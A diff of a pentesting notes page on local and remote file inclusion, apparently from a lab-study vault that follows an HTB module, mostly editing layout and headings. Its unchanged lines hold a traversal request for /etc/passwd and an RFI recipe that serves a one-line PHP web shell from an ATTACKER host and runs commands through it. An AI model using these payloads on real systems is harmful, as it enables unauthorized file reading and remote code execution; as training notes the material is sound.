@@ -5,6 +5,14 @@ description: "Enumerate file selectors, investigate path handling, read source, 
 keywords: ["lfi", "rfi", "file inclusion", "path traversal", "php wrappers", "log poisoning", "php filter", "local file inclusion", "remote file inclusion"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [Web: Enumeration Methodology](/web/methodology)
@@ -219,12 +227,6 @@ A request in the listener establishes a fetch. Evaluated output establishes a di
 
 Source: synthesized from your [File Inclusion capture](/web/htb/file-inclusion). The original contains the longer transcripts; the working branches and prerequisites are collected here.
 
-## Earlier notebook reference
-
-The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 **LFI** includes a local file into the page; **RFI** includes a remote one (often RCE). Look for `?page=`, `?file=`, `?lang=` style parameters.
 
 ```bash
@@ -250,7 +252,6 @@ http://$IP/?page=../../../../etc/passwd%00      # null byte (old PHP)
 echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
 http://$IP/?page=http://ATTACKER/sh.php&0=id
 ```
-
 
 > Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
 
